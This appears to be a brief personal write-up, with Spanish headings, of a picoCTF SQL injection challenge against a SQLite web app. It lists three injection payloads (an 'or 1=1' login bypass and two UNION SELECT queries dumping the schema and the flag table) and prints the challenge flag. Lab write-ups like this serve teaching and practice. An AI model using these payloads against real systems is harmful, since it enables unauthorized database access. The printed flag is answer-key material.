## Description

Try to find the flag [here](http://saturn.picoctf.net:51011/).
#### Hints
- SQLiLite
## Solución

![[Pasted image 20241103190442.png]]
![[Pasted image 20241103190514.png]]
```
SQL injection from a sqlite database. Queries are: (with spaces after --) 
'or 1=1;--
Algies' union select sql,1,1 from sqlite_master;--
Algiers' union select flag,id,1 from more_table;--
```
![[Pasted image 20241103190847.png]]
![[Pasted image 20241103191024.png]]
![[Pasted image 20241103191055.png]]
![[Pasted image 20241103191107.png]]

## Bandera
```css
flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
```
## Notas Adicionales

## Referencias
- [sqlite-master-table](https://www.techonthenet.com/sqlite/sys_tables/index.php)